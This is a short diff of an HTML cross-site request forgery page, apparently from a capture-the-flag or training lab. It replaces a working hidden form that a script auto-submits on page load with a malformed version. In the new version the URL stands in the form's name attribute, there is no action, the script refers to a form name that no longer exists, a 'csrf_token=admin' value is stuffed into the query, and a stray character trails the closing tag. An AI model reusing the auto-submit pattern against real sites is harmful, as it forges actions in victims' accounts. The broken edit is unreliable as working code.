@@ -1,7 +1,5 @@
-<form name="csrfForm" action="/root/grantComplete/csrfLesson?userId=exampleId " method="POST">
- <input type="hidden" name="userID" value= "-1519474321" />
- <input type="submit"/>
+<form name="/http/public/protected/flags/csrf_02/?firstname=pperson&lastname=StaR%2149*whiz&csrf_token=admin" method="POST">
 </form>
 <script>
  document.csrfForm.submit();
-</script>
+</script>x
